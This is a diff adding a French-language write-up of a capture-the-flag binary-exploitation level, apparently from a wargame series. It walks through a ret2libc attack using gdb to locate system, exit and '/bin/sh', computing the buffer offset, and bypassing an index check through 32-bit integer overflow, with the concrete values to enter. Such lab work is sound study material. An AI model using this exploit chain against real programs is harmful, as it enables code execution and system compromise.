@@ -1,0 +1,66 @@
+on test on rentre des grandes valeur ds le number et on voit que le max c est 4294967295
+on peut pas mettre d index multiple 3
+et on peut pas mettre de shell code en env car c est securise
+
+comme pr rainfall on va donc utilser un ret2libc il nous faut donc les adresses de system exit et bin/sh
+ on va utilier gdb
+
+b *main
+
+run 
+
+p exit
+
+p system 
+
+(gdb) find &system,+9999999,"/bin/sh"
+
+on a donc :
+
+system = 0xf7e6aed0
+exit = 0xf7e5eb70
+/bin/sh = 0xf7f897ec
+
+il nous faut mtn l adresse de retour du main avec info frame
+
+on a donc 
+
+return du main = 0xffffd70c
+
+il nous faut mtn l adresse de du buffer de nombre
+
+on va donc break a la fonction read nb et au moment du return.
+
+b *0x0804892b
+
+et 
+
+b *0x080489f1
+
+on a donc comme premiere adresse 0xffffd520 et comme derniere 0xffffd70c
+
+ceux qui ft un ecart de 456 et vu quu un uint c 4 octet ca ft 114
+
+petit bemol 114 est un multiple de 3 donc on peut pas l lire
+
+mais encore une fois grace a un des niveaux de rainfall on va pouvoir y acceder via le debordement d entier
+
+(expliation a la fin si necessaire)
+
+4294967296 / 4 = 1073741824 et vu qu on veut acceder aux 114 eme alors
+
+1073741824 + 114 = 1073741938
+
+on a juste a convertir nos adresse de system exit et bin sh en decimal
+
+system = 0xf7e6aed0 = 4159090384
+exit = 0xf7e5eb70 = 4159040368
+/bin/sh = 0xf7f897ec = 4160264172
+
+(Lorsque vous travaillez avec des types d'entiers à taille fixe, comme unsigned int en C ou C++ sur une architecture 32 bits, l'entier peut représenter des valeurs allant de 0 à 
+
+2 puissance 32  (4294967296), il débordera  et reviendra à 0.
+
+Ainsi, quand vous faites l'opération:
+
+2 ^ 32 / 4 c egale a 0/4 en entier 32 bits)
